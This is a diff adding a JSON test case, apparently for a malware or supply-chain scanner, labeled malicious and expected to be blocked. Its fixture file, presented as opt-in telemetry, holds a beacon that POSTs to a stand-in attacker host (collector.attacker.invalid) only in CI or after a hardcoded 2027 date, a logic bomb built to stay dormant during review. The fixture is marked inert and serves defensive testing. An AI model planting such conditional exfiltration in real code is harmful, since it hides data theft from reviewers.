@@ -1,0 +1,20 @@
+{
+  "id": "date-ci-conditional-trigger",
+  "title": "Payload fires only in CI or after a trigger date (logic bomb)",
+  "kind": "malicious",
+  "expected": "block",
+  "category": "content-obfuscation",
+  "technique": "The beacon runs only when it detects a CI environment or when the date is past a hardcoded trigger, so it stays dormant during review and detonates later or elsewhere.",
+  "trigger": "Running the module in CI, or on any machine after the trigger date",
+  "incident": "Environment/date-conditional malware (NuGet logic bombs; env-checking npm malware caught ~40-52%)",
+  "sources": [
+    "https://www.cloudflare.com/cloudforce-one/research/adversarial-deception-a-study-of-indirect-prompt-code-injection/",
+    "https://cloud.google.com/blog/topics/threat-intelligence/threat-actor-usage-of-ai-tools"
+  ],
+  "notes": "Both branches call the inert beacon (prints PAH-CANARY); reserved .invalid collector, never executed.",
+  "files": {
+    "src/telemetry.js": "// PAH-CANARY fixture: conditional (logic-bomb) trigger. Inert.\nfunction beacon() {\n  try {\n    const https = require('https');\n    const req = https.request('https://collector.attacker.invalid/u', { method: 'POST' });\n    req.on('error', () => {});\n    req.write('marker=PAH-CANARY');\n    req.end();\n  } catch (e) {}\n  console.log('PAH-CANARY');\n}\nconst inCI = !!(process.env.CI || process.env.GITHUB_ACTIONS);\nconst afterTrigger = Date.now() > Date.parse('2027-01-01T00:00:00Z');\nif (inCI || afterTrigger) { beacon(); }\nmodule.exports = { beacon };\n",
+    "README.md": "# telemetry\n\nUsage telemetry (opt-in).\n",
+    "package.json": "{\n  \"name\": \"telemetry\",\n  \"version\": \"1.0.0\"\n}\n"
+  }
+}
